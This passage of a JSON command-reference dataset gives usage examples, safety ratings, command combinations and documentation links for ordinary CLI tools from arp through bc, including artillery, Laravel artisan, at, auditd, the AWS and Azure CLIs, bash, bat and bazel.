        "explanation": "Ping network range then show discovered devices",
        "title": "ping > & arp | grep"
      }
    ],
    "relatedCommands": [
      {
        "name": "ip",
        "relationship": "modern-alternative",
        "reason": "ip neigh provides similar functionality with more features"
      }
    ],
    "warnings": [
      "ARP entries expire automatically",
      "May require root privileges for modifications",
      "Limited to local network segment"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/arp.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/arp.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "artillery",
    "subtitle": "Artillery",
    "description": "Cloud-native load testing toolkit", 
    "examples": [
      "artillery quick --count 10 --num 100 https://example.com  # Quick test with 10 virtual users making 100 requests each",
      "artillery run test-scenario.yml  # Run load test defined in YAML configuration file",
      "artillery run test.yml --output report.json && artillery report report.json  # Run test and generate HTML report from results",
      "artillery run test.yml --quiet | artillery-plugin-publish-metrics  # Run test with real-time metrics publishing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "artillery [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete testing workflow",
        "commands": "artillery run load-test.yml -o results.json && artillery report results.json && open report.html",
        "explanation": "Run load test, generate report, and open in browser",
        "title": "artillery && artillery && open"
      }
    ],
    "relatedCommands": [
      {
        "name": "k6",
        "relationship": "alternative",
        "reason": "Both are modern, developer-friendly load testing tools"
      },
      {
        "name": "locust",
        "relationship": "alternative",
        "reason": "Python-based alternative with web UI"
      }
    ],
    "warnings": [
      "YAML configuration makes tests easy to version control",
      "Built-in support for WebSocket and Socket.io testing",
      "Plugin system allows extensive customization"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.artillery.io/docs"
      },
      {
        "platform": "macos",
        "url": "https://www.artillery.io/docs"
      },
      {
        "platform": "windows",
        "url": "https://www.artillery.io/docs"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "artisan",
    "subtitle": "Laravel Artisan",
    "description": "Laravel PHP framework command-line interface",
    "examples": [
      "php artisan serve  # Start Laravel development server on localhost:8000",
      "php artisan make:controller UserController  # Create new UserController class",
      "php artisan migrate  # Execute pending database migrations",
      "php artisan make:model User -m  # Generate User model and corresponding migration",
      "php artisan cache:clear  # Clear all application caches",
      "php artisan key:generate  # Generate new application encryption key"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development", 
    "safety": "safe",
    "syntaxPattern": "php artisan <command> [options] [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Fresh database setup",
        "commands": "php artisan migrate:fresh && php artisan db:seed",
        "explanation": "Drop all tables, run migrations, and seed database",
        "title": "php && php"
      }
    ],
    "relatedCommands": [
      {
        "name": "composer",
        "relationship": "combo",
        "reason": "Laravel is installed and managed via Composer"
      },
      {
        "name": "php",
        "relationship": "underlying",
        "reason": "Artisan is a PHP script"
      }
    ],
    "warnings": [
      "Must be run from Laravel project root directory",
      "Database must be configured before running migrations",
      "Some commands require specific Laravel version"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://laravel.com/docs/artisan"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "at",
    "subtitle": "At",
    "description": "Schedule one-time tasks to run at specified times",
    "examples": [
      "echo 'backup.sh' | at 2:30  # Run backup.sh at 2:30 AM",
      "at 9:00 tomorrow  # Schedule interactive job for 9:00 AM tomorrow",
      "echo 'rm /tmp/tempfile' | at now + 1 hour  # Delete temporary file in 1 hour",
      "atq  # Display list of pending at jobs",
      "atrm 3  # Remove at job number 3",
      "at 10:00 2025-12-25  # Schedule job for Christmas morning"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "automation",
    "safety": "dangerous",
    "syntaxPattern": "at [time] or echo 'command' | at [time]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Temporary system maintenance",
        "commands": "echo 'systemctl restart apache2' | at now + 30 minutes && atq",
        "explanation": "Schedule service restart in 30 minutes and check queue",
        "title": "echo | at && atq"
      }
    ],
    "relatedCommands": [
      {
        "name": "cron",
        "relationship": "complementary",
        "reason": "cron handles recurring jobs, at handles one-time jobs"
      },
      {
        "name": "batch",
        "relationship": "similar",
        "reason": "batch runs jobs when system load is low"
      }
    ],
    "warnings": [
      "Jobs run with user's environment at scheduling time",
      "Output is typically emailed unless redirected",
      "Requires atd daemon to be running"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/at.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/at.html"
      },
      {
        "platform": "windows",
        "url": "Not available (use Task Scheduler)"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "auditd",
    "subtitle": "Audit Daemon", 
    "description": "Linux audit framework for security monitoring and compliance",
    "examples": [
      "auditctl -w /etc/passwd -p war -k passwd_changes  # Monitor passwd file for write, attribute, and read access",
      "ausearch -k passwd_changes  # Search for events with specific key",
      "auditctl -a always,exit -S open -k file_access  # Audit all open system calls",
      "aureport -au  # Generate authentication attempt report"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "auditctl [options] or ausearch [options]",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete file integrity monitoring",
        "commands": "auditctl -w /etc -p wa -k config_changes && ausearch -k config_changes",
        "explanation": "Monitor /etc directory and search for changes",
        "title": "auditctl && ausearch"
      }
    ],
    "relatedCommands": [
      {
        "name": "aide",
        "relationship": "combo",
        "reason": "Complementary file integrity monitoring"
      },
      {
        "name": "syslog",
        "relationship": "combo",
        "reason": "System logging integration"
      }
    ],
    "warnings": [
      "Can generate large amounts of log data",
      "Rules persist until reboot unless saved",
      "Performance impact with extensive monitoring"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "autoconf",
    "subtitle": "Automatic Configuration",
    "description": "Generate configure scripts for portable compilation",
    "examples": [
      "autoconf  # Generate configure script from configure.ac",
      "autoconf --force  # Regenerate configure script even if up to date",
      "autoconf -o configure configure.ac  # Generate configure script with specific name",
      "autoconf -I m4  # Include m4 directory for macro definitions"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "autoconf [options] [template-file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete autotools workflow",
        "commands": "autoreconf -fiv && ./configure && make && make install",
        "explanation": "Regenerate build system, configure, build, and install",
        "title": "autoreconf && && make && make"
      }
    ],
    "relatedCommands": [
      {
        "name": "automake",
        "relationship": "combo",
        "reason": "automake generates Makefile.in used by autoconf"
      },
      {
        "name": "configure",
        "relationship": "generates",
        "reason": "autoconf generates configure scripts"
      }
    ],
    "warnings": [
      "Part of GNU Autotools suite - can be complex",
      "Generates portable shell scripts for configuration",
      "Used mainly in traditional Unix software development"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/autoconf/manual/"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/autoconf/manual/"
      },
      {
        "platform": "windows",
        "url": "Not typically used"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "automake",
    "subtitle": "Automatic Make",
    "description": "Generate Makefile.in templates from Makefile.am",
    "examples": [
      "automake  # Generate Makefile.in from Makefile.am",
      "automake --add-missing  # Copy missing standard files to package",
      "automake --force-missing  # Replace existing standard files",
      "automake --copy  # Copy auxiliary files instead of creating symlinks"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "automake [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Initialize autotools project",
        "commands": "autoscan && mv configure.scan configure.ac && automake --add-missing --copy",
        "explanation": "Create initial autotools configuration",
        "title": "autoscan && mv && automake"
      }
    ],
    "relatedCommands": [
      {
        "name": "autoconf",
        "relationship": "combo",
        "reason": "Works with autoconf to create build system"
      },
      {
        "name": "aclocal",
        "relationship": "prerequisite",
        "reason": "aclocal generates aclocal.m4 needed by automake"
      }
    ],
    "warnings": [
      "Requires Makefile.am template files",
      "Complex but provides great portability",
      "Part of traditional Unix build system"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/automake/manual/"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/automake/manual/"
      },
      {
        "platform": "windows",
        "url": "Not typically used"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "awk",
    "subtitle": "Aho, Weinberger, Kernighan",
    "description": "Pattern scanning and data extraction language",
    "examples": [
      "awk '{print $1, $3}' data.txt  # Print first and third columns from space-separated data",
      "awk '{sum += $2} END {print sum}' numbers.txt  # Add up all values in second column",
      "awk '$3 > 100 {print $0}' sales.csv  # Print lines where third column value is greater than 100",
      "awk '/error/ {count++} END {print count}' log.txt  # Count occurrences of 'error' in log file",
      "awk -F',' '{print $1 \" -> \" $2}' input.csv  # Use comma as field separator and format output"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "awk '[pattern] {action}' [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Process log files for monitoring",
        "commands": "tail -f access.log | awk '{print $1, $7}' | sort | uniq -c",
        "explanation": "Monitor web access log, show unique IP and URL combinations",
        "title": "tail | awk | sort | uniq"
      },
      {
        "scenario": "Generate reports from CSV data",
        "commands": "awk -F',' '{if($3>threshold) total+=$3} END {print \"Total:\", total}' threshold=1000 data.csv",
        "explanation": "Sum values in CSV where column 3 exceeds threshold",
        "title": "awk > threshold"
      }
    ],
    "relatedCommands": [
      {
        "name": "sed",
        "relationship": "similar",
        "reason": "Both are stream editors, sed for substitution, awk for field processing"
      },
      {
        "name": "cut",
        "relationship": "similar",
        "reason": "Cut extracts columns, awk processes them with logic"
      },
      {
        "name": "grep",
        "relationship": "combo",
        "reason": "Grep finds lines, awk processes the found data"
      }
    ],
    "warnings": [
      "Field numbering starts at 1, not 0",
      "$0 refers to entire line, $NF to last field",
      "String comparisons need quotes: $1 == \"text\""
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/awk.1p.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/awk.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/gawk/manual/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "aws",
    "subtitle": "AWS CLI Advanced",
    "description": "Advanced AWS CLI operations for enterprise cloud management",
    "examples": [
      "aws ec2 create-vpc --cidr-block 10.0.0.0/16 --enable-dns-hostnames --enable-dns-support  # Create Virtual Private Cloud with DNS resolution enabled",
      "aws rds create-db-instance --db-instance-identifier mydb --db-instance-class db.t3.micro --engine mysql --master-username admin --master-user-password mypassword --multi-az --backup-retention-period 7  # Create highly available RDS MySQL instance with automated backups",
      "aws lambda create-function --function-name MyFunction --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://function.zip  # Deploy Lambda function with Python runtime",
      "aws ecs create-cluster --cluster-name production-cluster --capacity-providers FARGATE EC2 --default-capacity-provider-strategy capacityProvider=FARGATE,weight=1  # Create ECS cluster with Fargate and EC2 capacity providers",
      "aws eks create-cluster --name production-eks --version 1.27 --role-arn arn:aws:iam::123456789012:role/eks-service-role --resources-vpc-config subnetIds=subnet-12345,subnet-67890,securityGroupIds=sg-12345  # Create managed Kubernetes cluster with specified VPC configuration",
      "aws cloudformation create-stack --stack-name my-infrastructure --template-body file://template.yaml --parameters ParameterKey=Environment,ParameterValue=production --capabilities CAPABILITY_IAM  # Deploy infrastructure using CloudFormation template with IAM capabilities",
      "aws iam create-role --role-name MyServiceRole --assume-role-policy-document file://trust-policy.json --path /service-roles/  # Create IAM role with trust relationship policy document",
      "aws cloudwatch put-metric-alarm --alarm-name cpu-usage-high --alarm-description 'High CPU usage' --metric-name CPUUtilization --namespace AWS/EC2 --statistic Average --period 300 --threshold 80 --comparison-operator GreaterThanThreshold  # Create CloudWatch alarm for high EC2 CPU utilization",
      "aws s3api create-bucket --bucket my-versioned-bucket --create-bucket-configuration LocationConstraint=us-west-2 && aws s3api put-bucket-versioning --bucket my-versioned-bucket --versioning-configuration Status=Enabled  # Create S3 bucket in specific region with versioning enabled",
      "aws apigateway create-rest-api --name MyAPI --description 'Production API' --endpoint-configuration types=REGIONAL  # Create regional REST API Gateway for production use"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "aws [service] [operation] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete VPC setup with security",
        "commands": "aws ec2 create-vpc --cidr-block 10.0.0.0/16 && aws ec2 create-subnet --vpc-id vpc-12345 --cidr-block 10.0.1.0/24 --availability-zone us-east-1a && aws ec2 create-internet-gateway && aws ec2 attach-internet-gateway --internet-gateway-id igw-12345 --vpc-id vpc-12345",
        "explanation": "Create VPC, subnet, internet gateway and attach for complete network setup",
        "title": "aws && aws && aws && aws"
      },
      {
        "scenario": "Deploy application with load balancer",
        "commands": "aws elbv2 create-load-balancer --name my-load-balancer --subnets subnet-12345 subnet-67890 && aws elbv2 create-target-group --name my-targets --protocol HTTP --port 80 --vpc-id vpc-12345 && aws elbv2 create-listener --load-balancer-arn arn:aws:elasticloadbalancing:us-east-1:123456789012:loadbalancer/app/my-load-balancer/50dc6c495c0c9188 --protocol HTTP --port 80",
        "explanation": "Create application load balancer with target group and listener",
        "title": "aws && aws && aws"
      }
    ],
    "relatedCommands": [
      {
        "name": "terraform",
        "relationship": "alternative",
        "reason": "Infrastructure as Code alternative to CLI commands"
      },
      {
        "name": "sam",
        "relationship": "combo",
        "reason": "SAM CLI for serverless application deployment"
      }
    ],
    "warnings": [
      "IAM permissions required for each service operation",
      "Resource dependencies must be created in correct order",
      "Some operations may take several minutes to complete",
      "Cross-region replication requires specific configuration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.aws.amazon.com/cli/"
      },
      {
        "platform": "macos",
        "url": "https://docs.aws.amazon.com/cli/"
      },
      {
        "platform": "windows",
        "url": "https://docs.aws.amazon.com/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "aws-cli",
    "subtitle": "AWS Command Line Interface",
    "description": "Command-line interface for Amazon Web Services CloudWatch",
    "examples": [
      "aws cloudwatch list-metrics  # List all available CloudWatch metrics",
      "aws cloudwatch get-metric-statistics --namespace AWS/EC2 --metric-name CPUUtilization  # Get EC2 CPU utilization statistics",
      "aws cloudwatch put-metric-alarm --alarm-name cpu-alarm --metric-name CPUUtilization  # Create CloudWatch alarm for CPU utilization",
      "aws logs get-log-events --log-group-name /aws/lambda/function-name  # Retrieve log events from CloudWatch Logs",
      "aws logs create-log-group --log-group-name my-log-group  # Create new CloudWatch log group"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "aws [service] [operation] [parameters]",
    "prerequisites": [
      "aws-credentials"
    ],
    "commandCombinations": [
      {
        "scenario": "Monitor EC2 instance",
        "commands": "aws cloudwatch get-metric-statistics --namespace AWS/EC2 --metric-name CPUUtilization --dimensions Name=InstanceId,Value=i-1234567890abcdef0 --start-time 2023-01-01T00:00:00Z --end-time 2023-01-01T23:59:59Z --period 3600 --statistics Average",
        "explanation": "Get hourly average CPU utilization for specific EC2 instance",
        "title": "aws"
      }
    ],
    "relatedCommands": [
      {
        "name": "az",
        "relationship": "alternative",
        "reason": "Azure CLI for Azure Monitor"
      },
      {
        "name": "gcloud",
        "relationship": "alternative",
        "reason": "Google Cloud CLI for GCP monitoring"
      }
    ],
    "warnings": [
      "Requires AWS credentials configuration",
      "Rate limiting applies to CloudWatch APIs",
      "Metric retention periods vary by resolution"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.aws.amazon.com/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "az",
    "subtitle": "Azure CLI Advanced",
    "description": "Advanced Azure CLI operations for enterprise cloud management",
    "examples": [
      "az aks create --resource-group myResourceGroup --name myAKSCluster --node-count 3 --enable-addons monitoring --generate-ssh-keys --node-vm-size Standard_D2s_v3  # Create managed Kubernetes cluster with monitoring enabled",
      "az container create --resource-group myResourceGroup --name mycontainer --image nginx --dns-name-label aci-demo --ports 80  # Deploy container instance with public DNS name",
      "az sql server create --resource-group myResourceGroup --name myserver --admin-user myadmin --admin-password myPassword123! && az sql db create --resource-group myResourceGroup --server myserver --name mydatabase --service-objective S0  # Create SQL Server and database with basic tier",
      "az functionapp create --resource-group myResourceGroup --consumption-plan-location eastus --runtime python --runtime-version 3.9 --functions-version 4 --name myFunctionApp --storage-account mystorageaccount  # Create serverless Function App with Python runtime",
      "az network vnet create --resource-group myResourceGroup --name myVNet --address-prefix 10.0.0.0/16 --subnet-name mySubnet --subnet-prefix 10.0.0.0/24  # Create VNet with subnet for network isolation",
      "az network application-gateway create --resource-group myResourceGroup --name myAppGateway --location eastus --capacity 2 --sku Standard_v2 --public-ip-address myAGPublicIPAddress --vnet-name myVNet --subnet mySubnet  # Create layer 7 load balancer for web applications",
      "az pipelines create --name 'Build Pipeline' --repository https://github.com/user/repo --branch main --yaml-path azure-pipelines.yml  # Create CI/CD pipeline from GitHub repository",
      "az keyvault create --resource-group myResourceGroup --name myKeyVault --location eastus --enabled-for-deployment true --enabled-for-template-deployment true  # Create secure key and secret management service",
      "az cdn profile create --resource-group myResourceGroup --name myCDNProfile --sku Standard_Microsoft && az cdn endpoint create --resource-group myResourceGroup --name myEndpoint --profile-name myCDNProfile --origin myorigin.azurewebsites.net  # Create Content Delivery Network for global content distribution",
      "az monitor log-analytics workspace create --resource-group myResourceGroup --workspace-name myWorkspace --location eastus --sku pergb2018  # Create centralized logging and monitoring workspace"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "az [group] [subgroup] [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete AKS deployment with monitoring",
        "commands": "az aks create --resource-group myRG --name myAKS --node-count 3 --enable-addons monitoring && az aks get-credentials --resource-group myRG --name myAKS && kubectl get nodes",
        "explanation": "Create AKS cluster, get credentials, and verify nodes",
        "title": "az && az && kubectl"
      },
      {
        "scenario": "Web app with database deployment",
        "commands": "az appservice plan create --resource-group myRG --name myPlan --sku B1 && az webapp create --resource-group myRG --plan myPlan --name myWebApp && az sql server create --resource-group myRG --name myserver --admin-user admin --admin-password Password123!",
        "explanation": "Create complete web application stack with database",
        "title": "az && az && az"
      }
    ],
    "relatedCommands": [
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "AKS clusters managed through kubectl"
      },
      {
        "name": "terraform",
        "relationship": "alternative",
        "reason": "Infrastructure as Code alternative"
      }
    ],
    "warnings": [
      "Resource naming must be globally unique for some services",
      "Service principal authentication for automation",
      "Resource group location affects service availability"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.microsoft.com/en-us/cli/azure/"
      },
      {
        "platform": "macos",
        "url": "https://docs.microsoft.com/en-us/cli/azure/"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/cli/azure/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "banner",
    "subtitle": "Banner",
    "description": "Print large banner text",
    "examples": [
      "banner 'HELLO'  # Create simple block letter banner",
      "banner 'SYSTEM READY'  # Display system status message",
      "banner 'WARNING'  # Create attention-grabbing warning banner"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "banner [text]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System startup message",
        "commands": "banner 'BOOTING' && echo 'System initialization in progress...'",
        "explanation": "Display boot banner with status message",
        "title": "banner && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "figlet",
        "relationship": "advanced-alternative",
        "reason": "figlet provides more fonts and formatting options"
      }
    ],
    "warnings": [
      "Simpler than figlet but fewer options",
      "May not be available on all systems",
      "Typically uses hash (#) characters for text"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man6/banner.6.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/banner.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "basename",
    "subtitle": "base name",
    "description": "Extract filename from path",
    "examples": [
      "basename /path/to/file.txt  # Extract 'file.txt' from full path",
      "basename /path/to/file.txt .txt  # Get filename without extension: 'file'",
      "basename -a /path/file1.txt /other/file2.txt  # Extract basenames from multiple paths",
      "basename /path/to/directory/  # Get 'directory' from path ending with slash"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "basename <path> [suffix]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Rename files with basename",
        "commands": "for file in *.backup; do mv \"$file\" \"$(basename \"$file\" .backup)\"; done",
        "explanation": "Remove .backup extension from all backup files",
        "title": "for ; do ; done"
      },
      {
        "scenario": "Create output filename from input",
        "commands": "INPUT=data.csv && OUTPUT=\"$(basename \"$INPUT\" .csv).json\"",
        "explanation": "Generate output filename with different extension",
        "title": "INPUT && OUTPUT"
      }
    ],
    "relatedCommands": [
      {
        "name": "dirname",
        "relationship": "opposite",
        "reason": "dirname extracts directory path, basename extracts filename"
      },
      {
        "name": "realpath",
        "relationship": "combo",
        "reason": "Get absolute path then extract basename"
      },
      {
        "name": "cut",
        "relationship": "alternative",
        "reason": "Can extract path components using delimiters"
      }
    ],
    "warnings": [
      "basename removes trailing slashes from paths",
      "Empty path or just '/' returns specific results",
      "Suffix removal is exact match, not pattern matching"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/basename.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/basename.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/basename-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "bash",
    "subtitle": "Bourne Again Shell",
    "description": "Bourne Again Shell for command execution and scripting",
    "examples": [
      "bash script.sh  # Execute bash script file",
      "bash  # Start interactive bash session",
      "bash -c 'echo Hello World'  # Execute command from string",
      "bash -x script.sh  # Run script with execution trace",
      "bash -euo pipefail script.sh  # Run script with strict error checking",
      "bash -s < script.sh  # Run script from stdin"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "shell",
    "safety": "safe",
    "syntaxPattern": "bash [options] [script] [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe script execution",
        "commands": "bash -n script.sh && bash -euo pipefail script.sh",
        "explanation": "Check syntax then run with strict error handling",
        "title": "bash && bash"
      }
    ],
    "relatedCommands": [
      {
        "name": "sh",
        "relationship": "similar",
        "reason": "POSIX shell with fewer features than bash"
      },
      {
        "name": "zsh",
        "relationship": "alternative",
        "reason": "Advanced shell with additional features"
      }
    ],
    "warnings": [
      "Bash-specific features may not work in other shells",
      "Error handling behavior depends on options set"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/bash/manual/"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/bash/manual/"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/bash/manual/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "bat",
    "subtitle": "bat",
    "description": "Cat clone with syntax highlighting and Git integration",
    "examples": [
      "bat script.py  # Display Python file with color syntax highlighting",
      "bat -n config.json  # Display file with line numbers",
      "git diff | bat --language=diff  # Highlight Git diff output with proper colors",
      "bat --paging=always large-file.log  # Force paging for comfortable reading",
      "bat -r 10:20 file.txt  # Display lines 10 through 20 only"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "bat [options] [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "View multiple files with headers",
        "commands": "bat *.py",
        "explanation": "Show all Python files with filename headers",
        "title": "bat"
      },
      {
        "scenario": "Combine with other tools",
        "commands": "curl -s https://raw.githubusercontent.com/user/repo/main/README.md | bat -l md",
        "explanation": "Download and display markdown with syntax highlighting",
        "title": "curl | bat"
      }
    ],
    "relatedCommands": [
      {
        "name": "cat",
        "relationship": "alternative",
        "reason": "Traditional file viewer, bat adds syntax highlighting"
      },
      {
        "name": "less",
        "relationship": "similar",
        "reason": "Both paginate content, bat adds colors"
      },
      {
        "name": "highlight",
        "relationship": "similar",
        "reason": "Another syntax highlighting tool"
      }
    ],
    "warnings": [
      "May not work well in very minimal terminal environments",
      "Large files can be slow to syntax highlight",
      "Theme may need adjustment for terminal color scheme"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/sharkdp/bat"
      },
      {
        "platform": "macos",
        "url": "https://github.com/sharkdp/bat"
      },
      {
        "platform": "windows",
        "url": "https://github.com/sharkdp/bat"
      },
      {
        "platform": "generic",
        "url": "https://github.com/sharkdp/bat#usage"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "batch",
    "subtitle": "Batch",
    "description": "Schedule jobs to run when system load is low",
    "examples": [
      "echo 'heavy_computation.sh' | batch  # Run script when system load drops below threshold",
      "batch  # Enter commands interactively for batch execution",
      "atq  # Show pending batch jobs (same as at queue)"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "batch or echo 'command' | batch",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "System maintenance during low usage",
        "commands": "echo 'apt update && apt upgrade -y' | batch",
        "explanation": "Schedule system updates when load is low",
        "title": "echo && apt | batch"
      }
    ],
    "relatedCommands": [
      {
        "name": "at",
        "relationship": "similar",
        "reason": "Both use atd daemon, batch waits for low load"
      },
      {
        "name": "nice",
        "relationship": "complementary",
        "reason": "nice adjusts process priority, batch waits for low load"
      }
    ],
    "warnings": [
      "Jobs wait until load average drops below 1.5 (configurable)",
      "Useful for CPU-intensive tasks during off-peak hours",
      "Same queue system as at command"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/batch.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/batch.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "bazel",
    "subtitle": "Bazel",
    "description": "Scalable build tool for multi-language projects",
    "examples": [
      "bazel build //...  # Build all targets in workspace",
      "bazel build //myapp:binary  # Build specific binary target",
      "bazel test //...  # Run all tests in workspace",
      "bazel run //myapp:binary  # Build and run binary target",
      "bazel query 'deps(//myapp:binary)'  # Show dependencies of target",
      "bazel clean  # Clean build outputs",
      "bazel build //... --remote_cache=http://build-cache.company.com:8080  # Build with remote cache optimization",
      "bazel query 'deps(//...)' --output graph  # Generate dependency graph for entire workspace"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "bazel [command] [options] [targets]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Continuous integration",
        "commands": "bazel build //... && bazel test //... && bazel query 'tests(//...)'",
        "explanation": "Build everything, run tests, and list test targets",
        "title": "bazel && bazel && bazel"
      }
    ],
    "relatedCommands": [
      {
        "name": "buck",
        "relationship": "similar",
        "reason": "Both are scalable build systems for large projects"
      },
      {
        "name": "gradle",
        "relationship": "alternative",
        "reason": "Gradle is popular for JVM-based projects"
      }
    ],
    "warnings": [
      "Uses BUILD files to define targets and dependencies",
      "Excellent for large, multi-language monorepos",
      "Steep learning curve but very powerful"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://bazel.build/docs"
      },
      {
        "platform": "macos",
        "url": "https://bazel.build/docs"
      },
      {
        "platform": "windows",
        "url": "https://bazel.build/docs"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "bc",
    "subtitle": "Basic Calculator",
    "description": "Arbitrary precision calculator for mathematical computations",
    "examples": [
      "bc  # Launch bc interactive mathematical calculator",
      "bc -l  # Start bc with math library for scientific functions",
      "echo '2^100' | bc  # Calculate 2 to the power of 100",
      "echo 'scale=10; 22/7' | bc -l  # Calculate pi approximation with 10 decimal places",
      "echo 'obase=16; 255' | bc  # Convert 255 to hexadecimal",
      "echo 'obase=2; 42' | bc  # Convert 42 to binary",
      "echo 'scale=6; define compound(p,r,n) { return p * ((1 + r/100)^n) } compound(100000, 7.5, 30)' | bc -l  # Calculate compound interest",
      "echo 'scale=10; sqrt(2) * sin(3.14159/4)' | bc -l  # Advanced mathematical calculations"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "bc [options] [file]",
    "prerequisites": [
